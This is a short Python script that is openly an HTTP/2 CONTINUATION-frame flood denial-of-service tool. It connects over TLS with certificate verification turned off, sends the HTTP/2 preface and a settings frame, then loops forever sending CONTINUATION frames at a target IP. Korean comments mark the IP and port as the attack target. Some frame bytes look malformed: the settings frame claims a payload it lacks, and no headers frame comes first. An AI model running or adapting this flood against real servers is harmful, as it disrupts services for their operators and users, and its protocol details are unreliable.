import socket
import ssl

def send_continuation_frames(target_ip, target_port):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=target_ip)
    conn.connect((target_ip, target_port))

    # HTTP/2 connection preface
    preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    conn.send(preface)

    # HTTP/2 settings frame
    settings_frame = b'\x00\x00\x12\x04\x00\x00\x00\x00\x00'
    conn.send(settings_frame)

    # Read the settings acknowledgement
    conn.recv(4096)

    # HTTP/2 CONTINUATION frame
    continuation_frame = b'\x00\x00\xff\x09\x00\x00\x00\x00\x01' + b'A' * 255

    try:
        while True:
            conn.send(continuation_frame)
    except KeyboardInterrupt:
        print("Attack stopped.")
    finally:
        conn.close()

if __name__ == "__main__":
    target_ip = "192.168.56.1"  # 공격 대상 IP
    target_port = 443        # 공격 대상 포트 (HTTPS)

    print(f"Starting DoS attack on {target_ip}:{target_port}")
    send_continuation_frames(target_ip, target_port)
